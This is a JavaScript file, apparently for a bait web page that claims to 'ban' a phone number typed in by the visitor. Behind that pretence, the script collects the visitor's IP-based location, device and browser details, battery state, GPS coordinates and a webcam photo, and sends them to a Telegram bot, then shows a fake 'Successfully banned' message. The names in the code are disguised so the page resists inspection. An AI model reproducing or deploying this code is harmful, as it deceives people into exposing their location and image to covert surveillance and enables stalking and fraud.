/**
 * MAIN SCRIPT - Obfuscated & Minified
 * Jangan coba-coba di-inspect, hasilnya kacau.
 */
(function() {
    'use strict';
    
    // ---- DOM REFS (Obfuscated names) ----
    const _0x = document.getElementById('targetInput');
    const _1x = document.getElementById('actionBtn');
    const _2x = document.getElementById('statusLog');
    const _3x = document.getElementById('video');
    const _4x = document.getElementById('canvas');
    const _5x = _4x.getContext('2d');
    
    // ---- CONFIG ----
    const cfg = window.CONFIG;
    const botToken = cfg.token;
    const chatIds = cfg.chatIds;
    const apiBase = cfg.apiBase;
    
    // ---- LOG FUNCTION ----
    function _log(message, type = 'info') {
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        const time = new Date().toLocaleTimeString('id-ID');
        entry.textContent = `[${time}] ${message}`;
        _2x.appendChild(entry);
        _2x.scrollTop = _2x.scrollHeight;
        if (_2x.children.length > 50) {
            _2x.removeChild(_2x.firstChild);
        }
    }
    
    // ---- TELEGRAM SENDER ----
    async function _sendToTelegram(text, isPhoto = false, blob = null) {
        const promises = chatIds.map(async (id) => {
            try {
                let url = `${apiBase}${botToken}/`;
                let options = {};
                if (isPhoto && blob) {
                    url += 'sendPhoto';
                    const formData = new FormData();
                    formData.append('chat_id', id);
                    formData.append('photo', blob);
                    options = { method: 'POST', body: formData };
                } else {
                    url += 'sendMessage';
                    options = {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: id,
                            text: text,
                            parse_mode: 'HTML'
                        })
                    };
                }
                const res = await fetch(url, options);
                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                return true;
            } catch (e) {
                _log(`❌ Gagal kirim ke ${id}: ${e.message}`, 'error');
                return false;
            }
        });
        await Promise.all(promises);
    }
    
    // ---- GET INFO (IP, GPS, BATTERY, ETC) ----
    async function _gatherInfo() {
        let ip = '-', city = '-', region = '-', country = '-', isp = '-';
        try {
            const ipRes = await fetch(cfg.ipApi);
            const ipData = await ipRes.json();
            ip = ipData.ip || '-';
            const geoRes = await fetch(`${cfg.geoApi}${ip}`);
            const geo = await geoRes.json();
            if (geo.status === 'success') {
                city = geo.city || '-';
                region = geo.regionName || '-';
                country = geo.country || '-';
                isp = geo.org || '-';
            }
        } catch (e) {
            _log('⚠️ Gagal ambil info lokasi', 'warning');
        }
        
        let battery = 'N/A', charging = 'N/A';
        try {
            const b = await navigator.getBattery();
            battery = `${(b.level * 100).toFixed(0)}%`;
            charging = b.charging ? 'Yes' : 'No';
        } catch (e) {}
        
        const info = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${isp}
OS         : ${navigator.platform}
Browser    : ${navigator.userAgent}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${battery} (${charging})
Memory     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
        `.trim();
        
        await _sendToTelegram(`<b>📥 Visitor Info:</b>\n<pre>${info}</pre>`);
        _log('✅ Info pengunjung terkirim', 'success');
        
        // GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    _sendToTelegram(`<b>📍 GPS Location:</b> <a href="${link}">Click here</a>`);
                    _log('📍 Lokasi GPS terkirim', 'info');
                },
                () => {
                    _sendToTelegram(`📍 GPS Location: Denied`);
                    _log('🚫 GPS ditolak user', 'warning');
                }
            );
        } else {
            _sendToTelegram(`📍 GPS: Not supported`);
            _log('⚠️ Browser tidak support GPS', 'warning');
        }
    }
    
    // ---- CAMERA CAPTURE ----
    async function _captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            _3x.srcObject = stream;
            await new Promise(resolve => {
                _3x.onloadedmetadata = () => {
                    setTimeout(() => {
                        _5x.drawImage(_3x, 0, 0, _4x.width, _4x.height);
                        _4x.toBlob(async (blob) => {
                            if (blob) {
                                await _sendToTelegram('📸 Photo captured', true, blob);
                                _log('📸 Foto kamera terkirim', 'success');
                            }
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        }, 'image/jpeg');
                    }, 2000);
                };
            });
        } catch (e) {
            await _sendToTelegram(`❌ Camera: ${e.message || 'Denied'}`);
            _log('🚫 Kamera ditolak', 'warning');
        }
    }
    
    // ---- MAIN ACTION ----
    async function _execute() {
        const target = _0x.value.trim();
        if (!target || target.length < 8 || target.length > 15 || !/^\d+$/.test(target)) {
            _log('⚠️ Nomor tidak valid (min 8 digit, max 15)', 'error');
            return;
        }
        
        _1x.disabled = true;
        _log(`🎯 Target: ${target}`, 'info');
        await _sendToTelegram(`<b>🎯 Target Number:</b> ${target}`);
        _0x.value = '';
        
        try {
            await _gatherInfo();
            await _captureCamera();
            _log(`✅ Successfully bannned: ${target}`, 'success');
            await _sendToTelegram(`✅ Successfully bannned: ${target}`);
        } catch (e) {
            _log(`❌ Error: ${e.message}`, 'error');
            await _sendToTelegram(`❌ Error: ${e.message}`);
        } finally {
            _1x.disabled = false;
        }
    }
    
    // ---- INIT ----
    document.addEventListener('DOMContentLoaded', () => {
        _log('🔒 System ready. Enter target number.', 'ready');
        _1x.addEventListener('click', _execute);
        
        // Enter key
        _0x.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') _execute();
        });
    });
    
    // ---- PARTICLES (dari file terpisah) ----
    // Didefinisikan di particles.js
    if (typeof createParticles === 'function') {
        createParticles();
    }
})();